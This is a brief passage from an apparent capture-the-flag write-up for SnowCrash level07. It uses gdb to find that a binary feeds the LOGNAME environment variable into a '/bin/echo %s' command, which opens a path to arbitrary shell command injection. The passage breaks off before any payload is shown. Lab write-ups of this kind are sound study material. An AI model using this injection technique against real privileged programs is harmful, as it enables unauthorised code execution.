...
We are greeted with another binary
```bash
...
level07@SnowCrash:~$
```
Disassembling main gives back this:
```bash
level07@SnowCrash:~$ gdb -batch -ex 'file level07' -ex 'disassemble main'
...
```
The arguments to `getenv` and `asprintf` look interesting, let's take a look with `gdb`.
```bash
level07@SnowCrash:~$ gdb -batch -ex 'file level07' -ex 'x/s 0x8048680' -ex 'x/s 0x8048688'
0x8048680:       "LOGNAME"
0x8048688:       "/bin/echo %s "
```
Interesting, so setting the environment variable `LOGNAME` to something allows us to execute an arbitrary shell command.
```bash
